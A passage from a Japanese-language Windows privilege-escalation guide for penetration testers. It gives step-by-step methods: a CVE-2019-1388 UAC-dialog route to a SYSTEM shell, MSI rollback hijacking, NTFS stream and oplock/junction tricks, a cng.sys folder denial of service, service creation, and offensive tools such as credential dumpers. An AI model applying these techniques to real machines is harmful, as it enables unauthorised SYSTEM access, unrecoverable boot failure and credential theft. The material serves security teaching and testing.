これにより、同じ脆弱性を使って権限昇格と UAC のバイパスを同時に行うことができます。さらに、何もインストールする必要はなく、プロセス中に使用されるバイナリは Microsoft によって署名・発行されています。

影響を受けるシステムの一部は以下のとおりです：
```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```
この脆弱性を悪用するには、次の手順を実行する必要があります:
```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```
You have all the necessary files and information in the following GitHub repository:

https://github.com/jas502n/CVE-2019-1388

## Administrator の Medium から High Integrity Level へ / UAC Bypass

これを読んで **Integrity Levels について学ぶ**:


{{#ref}}
integrity-levels.md
{{#endref}}

次に、**UAC と UAC bypasses について学ぶ**にはこれを読んでください:


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## From Arbitrary Folder Delete/Move/Rename to SYSTEM EoP

この手法は[**in this blog post**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks)で説明されており、エクスプロイトコードは[**available here**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs)にあります。

攻撃は基本的に Windows Installer の rollback 機能を悪用して、アンインストール中に正当なファイルを悪意あるものに置き換えるものです。これには攻撃者が **malicious MSI installer** を作成して `C:\Config.Msi` フォルダをハイジャックし、後に Windows Installer が他の MSI パッケージのアンインストール時に rollback ファイルを格納する際に、その rollback ファイルが改ざんされて悪意あるペイロードを含むようにする必要があります。

要約すると手順は次の通りです:

1. **Stage 1 – ハイジャックの準備（`C:\Config.Msi` を空にしておく）**

- Step 1: Install the MSI
- 書き込み可能なフォルダ（`TARGETDIR`）に無害なファイル（例: `dummy.txt`）をインストールする `.msi` を作成します。
- インストーラを **"UAC Compliant"** とマークし、**non-admin user** が実行できるようにします。
- インストール後、そのファイルへの **handle** を開いたままにしておきます。

- Step 2: Begin Uninstall
- 同じ `.msi` をアンインストールします。
- アンインストール処理はファイルを `C:\Config.Msi` に移動し、`.rbf` ファイルとしてリネームして（rollback バックアップ）保存し始めます。
- `GetFinalPathNameByHandle` を使ってオープンしているファイルハンドルをポーリングし、そのファイルが `C:\Config.Msi\<random>.rbf` になったことを検出します。

- Step 3: Custom Syncing
- `.msi` には **カスタムアンインストールアクション（`SyncOnRbfWritten`）** が含まれており、
- `.rbf` が書き込まれたことをシグナルします。
- その後、アンインストールを続行する前に別のイベントを待機します。

- Step 4: Block Deletion of `.rbf`
- シグナルを受けたら、`.rbf` ファイルを `FILE_SHARE_DELETE` なしで開きます — これによりそのファイルの削除が**防がれます**。
- その後、アンインストールが完了できるようにシグナルを返します。
- Windows Installer は `.rbf` を削除できず、全ての内容を削除できないため、**`C:\Config.Msi` は削除されません**。

- Step 5: Manually Delete `.rbf`
- あなた（攻撃者）がその `.rbf` ファイルを手動で削除します。
- これで **`C:\Config.Msi` が空**になり、ハイジャックの準備が整います。

> この時点で、`C:\Config.Msi` を削除するために **SYSTEM-level arbitrary folder delete vulnerability** をトリガーします。

2. **Stage 2 – Rollback スクリプトを悪意あるものに置き換える**

- Step 6: Recreate `C:\Config.Msi` with Weak ACLs
- 自分で `C:\Config.Msi` フォルダを再作成します。
- 弱い DACL（例: Everyone:F）を設定し、`WRITE_DAC` を持ったハンドルを開いたままにします。

- Step 7: Run Another Install
- 再び `.msi` をインストールします。以下を指定します:
- `TARGETDIR`: 書き込み可能な場所
- `ERROROUT`: 強制失敗を引き起こす変数
- このインストールは再び **rollback** をトリガーするために使用され、`.rbs` と `.rbf` が読み込まれます。

- Step 8: Monitor for `.rbs`
- `ReadDirectoryChangesW` を使って `C:\Config.Msi` を監視し、新しい `.rbs` が出現するまで待ちます。
- そのファイル名をキャプチャします。

- Step 9: Sync Before Rollback
- `.msi` には **カスタムインストールアクション（`SyncBeforeRollback`）** が含まれており、
- `.rbs` が作成されたときにイベントをシグナルします。
- その後、続行する前に待機します。

- Step 10: Reapply Weak ACL
- `.rbs created` イベントを受け取った後:
- Windows Installer は `C:\Config.Msi` に強い ACL を再適用します。
- しかしあなたは `WRITE_DAC` を持ったハンドルを保持しているため、再度弱い ACL を適用できます。

> ACL は **ハンドルを開いた時にのみ適用される** ので、フォルダへの書き込みはまだ可能です。

- Step 11: Drop Fake `.rbs` and `.rbf`
- `.rbs` ファイルを上書きして、Windows に次を行わせる **偽の rollback スクリプト** を置きます:
- 権限の高い場所（例: `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`）にあなたの `.rbf`（悪意ある DLL）を復元するよう指示する。
- 悪意ある SYSTEM レベルのペイロード DLL を含む偽の `.rbf` を配置する。

- Step 12: Trigger the Rollback
- 同期イベントをシグナルしてインストーラを再開させます。
- 既知の地点でインストールを意図的に失敗させる **type 19 custom action（`ErrorOut`）** が設定されています。
- これにより **rollback が開始** します。

- Step 13: SYSTEM Installs Your DLL
- Windows Installer はあなたの悪意ある `.rbs` を読み、
- ターゲット場所にあなたの `.rbf` DLL をコピーします。
- これで **SYSTEM がロードするパスに悪意ある DLL が配置されます**。

- Final Step: Execute SYSTEM Code
- 信頼された **auto-elevated binary**（例: `osk.exe`）を実行して、ハイジャックした DLL をロードさせます。
- **ブーム**: あなたのコードが **SYSTEM として実行** されます。

### From Arbitrary File Delete/Move/Rename to SYSTEM EoP

前述の主な MSI rollback 手法は、`C:\Config.Msi` のような**フォルダ全体**を削除できることを前提としています。しかし、あなたの脆弱性が **任意のファイル削除** のみを許す場合はどうでしょうか？

この場合、**NTFS internals** を悪用できます: すべてのフォルダには隠しの代替データストリームが存在します。
```
C:\SomeFolder::$INDEX_ALLOCATION
```
このストリームはフォルダの**インデックスメタデータ**を格納します。

したがって、フォルダの**`::$INDEX_ALLOCATION`ストリームを削除すると**、NTFSはファイルシステムから**そのフォルダ全体を削除します**。

これを行うには、標準のファイル削除 APIs を使用できます。例:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```
> あなたが*ファイル*削除APIを呼び出しているにもかかわらず、**フォルダ自体を削除します**。

### フォルダ内容の削除から SYSTEM EoP へ
プリミティブが任意のファイル/フォルダを削除できないが、**攻撃者が制御するフォルダの*内容*の削除を許可する場合はどうするか？**

1. ステップ1: おとりフォルダとファイルを準備
- 作成: `C:\temp\folder1`
- その中に: `C:\temp\folder1\file1.txt`

2. ステップ2: `file1.txt` に **oplock** を設置
- 特権プロセスが `file1.txt` を削除しようとすると、oplock は **実行を一時停止** します。
```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```
3. ステップ3: SYSTEM プロセスをトリガーする（例: `SilentCleanup`）
- このプロセスはフォルダ（例: `%TEMP%`）をスキャンし、その中身を削除しようとします。
- `file1.txt` に到達すると、**oplock がトリガーされ**、制御があなたのコールバックに渡されます。

4. ステップ4: oplock コールバック内 – 削除をリダイレクトする

- オプション A: `file1.txt` を別の場所に移動する
- これにより `folder1` は空になり、oplock は破られません。
- `file1.txt` を直接削除しないでください — それは oplock を早期に解除してしまいます。

- オプション B: `folder1` を **junction** に変換する:
```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```
- オプション C: `\RPC Control` に **symlink** を作成する:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```
> これはフォルダのメタデータを格納しているNTFSの内部ストリームを標的にしており — それを削除するとフォルダ自体が削除されます。

5. ステップ 5: oplock を解放する
- SYSTEM プロセスは続行し、`file1.txt` を削除しようとします。
- しかし今、junction + symlink のため、実際に削除されているのは:
```
C:\Config.Msi::$INDEX_ALLOCATION
```
**結果**: `C:\Config.Msi` は SYSTEM によって削除される。

### 任意フォルダ作成から恒久的DoSへ

あるプリミティブを悪用して、**SYSTEM/admin として任意のフォルダを作成する** — たとえ **ファイルを書き込めない** や **弱いパーミッションを設定できない** 場合でも。

**フォルダ**（ファイルではなく）を、**重要な Windows ドライバ** の名前で作成する。例:
```
C:\Windows\System32\cng.sys
```
- このパスは通常 `cng.sys` カーネルモードドライバに対応します。
- もしそれを**フォルダとして事前に作成すると**、Windows は起動時に実際のドライバを読み込めなくなります。
- その後、Windows は起動中に `cng.sys` を読み込もうとします。
- フォルダを検出すると、**実際のドライバを解決できず**、**クラッシュまたは起動が停止**します。
- 外部からの介入（例: ブート修復やディスクアクセス）がなければ、**フォールバックはなく**、**回復できません**。


## **High Integrity から System へ**

### **新しいサービス**

もし既に High Integrity のプロセスで実行している場合、**SYSTEM へのパス**は、**新しいサービスを作成して実行するだけで**簡単になることがあります：
```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```
> [!TIP]
> サービス用バイナリを作成する際は、それが有効なサービスであること、またはサービスとして動作するために必要な処理をできるだけ迅速に行うことを確認してください。そうでない場合、プロセスは20秒で終了されます。

### AlwaysInstallElevated

High Integrity プロセスからは、**enable the AlwaysInstallElevated registry entries** を試み、_**.msi**_ ラッパーを使ってリバースシェルを**install**することができます。\
[関係するレジストリキーと_.msi_パッケージのインストール方法の詳細はこちら.](#alwaysinstallelevated)

### High + SeImpersonate を用いた System への昇格

**確認できます** [**コードはこちらで確認**](seimpersonate-from-high-to-system.md)**.**

### SeDebug + SeImpersonate から Full Token privileges へ

これらのトークン権限を持っている場合（おそらく既に High Integrity なプロセス内で見つかるでしょう）、SeDebug 権限でほとんどのプロセス（protected processes を除く）を開き、そのプロセスのトークンをコピーして、そのトークンで任意のプロセスを作成できます。\
この手法では通常、全てのトークン権限を持つ SYSTEM として実行中のプロセスを選択します（はい、全てのトークン権限を持たない SYSTEM プロセスも存在します）。\
**例コードはここで確認できます** [**here**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

この手法は meterpreter が getsystem を行う際に使用されます。手順はパイプを作成し、そのパイプに書き込むためのサービスを作成/悪用することです。パイプを作成した server 側が **SeImpersonate** 権限を使用すると、パイプクライアント（サービス）のトークンを偽装して SYSTEM 権限を取得できます。\
名前付きパイプについて詳しく知りたい場合は[**こちらを読むべきです**](#named-pipe-client-impersonation)。\
High Integrity から System へ名前付きパイプで昇格する例を読みたい場合は[**こちら**](from-high-integrity-to-system-with-name-pipes.md)を参照してください。

### Dll Hijacking

SYSTEM として動作するプロセスによってロードされる DLL をハイジャックできれば、当該権限で任意のコードを実行できます。したがって Dll Hijacking は権限昇格に有用であり、さらに High Integrity プロセスからは達成がはるかに簡単です。これは High Integrity プロセスが DLL をロードするフォルダに対して書き込み権限を持っているためです。\
**詳細は以下を参照してください** [**learn more about Dll hijacking here**](dll-hijacking/index.html)**.**

### **From Administrator or Network Service to System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### LOCAL SERVICE または NETWORK SERVICE から full privs へ

**参照:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## More help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Useful tools

**Windows local privilege escalation vectors を探すためのベストツール:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- 設定ミスや機密ファイルをチェック（**[**check here**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**）。検出済。**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- 一部の設定ミスをチェックし情報を収集（**[**check here**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**）。**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- 設定ミスのチェック**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- PuTTY, WinSCP, SuperPuTTY, FileZilla, RDP の保存セッション情報を抽出します。ローカルでは -Thorough を使用してください。**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Credential Manager から資格情報を抽出します。検出済。**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- 収集したパスワードをドメイン内にスプレー**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- PowerShell ベースの ADIDNS/LLMNR/mDNS/NBNS スプーファー兼 MITM ツール。**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- 基本的な Windows の権限昇格用列挙**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **\~\~**\~\~ -- 既知の privesc 脆弱性を検索（Watson に非推奨で置換）\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- ローカルチェック **(管理権限が必要)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- 既知の privesc 脆弱性を検索（VisualStudio でのコンパイルが必要）（[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/watson)）\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- ホストを列挙し設定ミスを検索（情報収集ツール寄り、権限昇格専用ではない）（コンパイルが必要）**（**[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**）**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- 多数のソフトウェアから資格情報を抽出（GitHub にプリコンパイル済バイナリあり）**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- PowerUp の C# ポート**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **\~\~**\~\~ -- 設定ミスのチェック（実行ファイルは GitHub にプリコンパイル済）。推奨しません。Win10 ではうまく動作しないことが多いです。\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- 設定ミスのチェック（python から exe を生成）。推奨しません。Win10 ではうまく動作しないことが多いです。

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- この投稿に基づいて作成されたツール（正常に動作するには accesschk は不要だが、使用することは可能）。

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- **systeminfo** の出力を読み取り、動作するエクスプロイトを推奨します（ローカル python）\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- **systeminfo** の出力を読み取り、動作するエクスプロイトを推奨します（ローカル python）

**Meterpreter**

_multi/recon/local_exploit_suggestor_

プロジェクトは正しいバージョンの .NET を使ってコンパイルする必要があります（[see this](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)）。被害者ホストにインストールされている .NET のバージョンを確認するには、次のようにします：
```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```
## 参考資料

- [http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)
- [http://www.greyhathacker.net/?p=738](http://www.greyhathacker.net/?p=738)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/sagishahar/lpeworkshop](https://github.com/sagishahar/lpeworkshop)
- [https://www.youtube.com/watch?v=\_8xJaaQlpBo](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections)

- [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) and kernel token theft](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)

- [Check Point Research – Chasing the Silver Fox: Cat & Mouse in Kernel Shadows](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)

{{#include ../../banners/hacktricks-training.md}}
